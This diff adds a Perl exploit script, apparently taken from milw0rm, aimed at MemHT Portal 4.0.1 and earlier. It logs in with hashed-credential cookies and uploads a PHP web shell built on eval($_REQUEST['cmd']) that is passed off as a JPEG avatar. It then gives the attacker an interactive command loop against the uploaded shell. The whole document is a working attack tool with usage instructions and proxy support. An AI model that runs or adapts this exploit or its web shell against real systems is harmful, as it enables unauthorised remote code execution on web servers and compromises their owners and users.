@@ -1,0 +1,177 @@
+#!/usr/bin/perl 
+# MemHT Portal <= 4.0.1 (avatar) Remote Code Execution Exploit
+# by yeat - staker[at]hotmail[dot]it
+
+use Getopt::Std;
+use Digest::MD5('md5_hex');
+use LWP::UserAgent;
+
+
+getopts('p:',\my %opts);
+
+my ($host,$file,$id,$username,$password) = @ARGV;
+
+my $http = new LWP::UserAgent;
+my $u_agent = "Lynx (textmode)";
+my $cookies = "login_user=$id#".md5_hex($username)."#".md5_hex($password);
+
+
+Main::RunExploit();
+
+
+# Main Package
+
+package Main;
+
+
+sub Usage {
+
+return print <<EOF;
++--------------------------------------------------------------+
+| MemHT Portal <= 4.0.1 (avatar) Remote Code Execution Exploit |
++--------------------------------------------------------------+
+by yeat - staker[at]hotmail[dot]it
+
+Usage: perl xpl.pl host/path file id user pass [OPTIONS]
+host: target host and memht path
+file: file to upload
+user: valid username
+pass: valid password
+id: user id
+
+Options:
+
+-p [specify a proxy] [server]:[port]
+
+Example: 
+perl xpl.pl localhost/memht yeat.php 38 MrJack obscure 
+perl xpl.pl localhost/memht yeat.php 38 MrJack obscure -p 213.151.89.109:80
+
+EOF
+
+}
+
+
+sub RunExploit 
+{    
+    if (defined $opts{p}) {
+        HTTP::Proxy($opts{p});
+    }
+    
+    if (@ARGV < 5 || @ARGV > 7) {
+        Main::Usage();
+    }
+    else { 
+        HTTP::UserAgent($u_agent);
+        MemHT::Login();     
+        MemHT::Exploit($file);
+    }    
+}
+
+
+
+
+# MemHT Exploit Package
+
+package MemHT;
+
+sub Exploit 
+{
+    my $resp;
+    my $file = shift(@_);
+    my $path = "/index.php?page=users&op=editProfile";
+
+    my $data = {
+        chg_email => 'yeat@doesntexist.net',
+        avatar    => [
+                      undef,
+                      $file,
+                      Content_Type => 'image/jpeg',
+                      Content      => '<?php error_reporting(E_ALL); eval($_REQUEST[\'cmd\']); ?>',
+                      # Content => 'Here you can write everything :) this is an example!',
+                     ],
+        chg       => 'true',
+        Submit    => 'Modify',
+    };  
+    
+    my $send = $http->post('http://'.$host.$path,
+                           $data,
+                           Content_Type => 'multipart/form-data',
+                          );
+    
+    if ($send->as_string =~ m{logout}i) {
+        print "File Uploaded! / $host/images/avatar/uploaded/$file\n\n";
+        
+        while (1) {
+           print "\n[yeat-PHPshell]:~# ";
+           chomp(my $content = <STDIN>);
+           $resp = HTTP::GET("$host/images/avatar/uploaded/$file?cmd=$content");
+           print $resp->content;
+        }                         
+    }
+    else {
+        print "Exploit Failed!\n";
+        exit;
+    }     
+}   
+           
+
+sub Login
+{
+    HTTP::Cookies($cookies);
+    my $response = HTTP::GET($host.'/index.php?page=pvtmsg&op=newMessage');
+    
+    if ($response->content =~ /access denied/i) {
+        print "Login Failed!\n";
+        exit;
+    }
+}           
+           
+                                 
+
+# HTTP Package
+
+package HTTP;
+
+
+sub Cookies 
+{
+    return $http->default_header('Cookie' => $_[0]);
+}
+
+sub UserAgent 
+{
+    return $http->agent($_[0]);
+}    
+
+sub GET 
+{    
+    if ($_[0] !~ m{^http://(.+?)$}i) {
+        return $http->get('http://'.$_[0]);
+    }    
+    else {
+        return $http->get($_[0]);
+    }    
+}
+    
+sub POST 
+{   
+    if ($_[0] !~ m{^http://(.+?)$}i) {
+        return $http->post('http://'.$_[0]);
+    }    
+    else {
+        return $http->post($_[0]);
+    }    
+}
+    
+sub http_header 
+{
+    return $http->default_header($_[0]);
+}            
+    
+sub Proxy 
+{
+    return $http->proxy('http', 'http://'.$_[0]);   
+}   
+
+# milw0rm.com [2009-01-25]
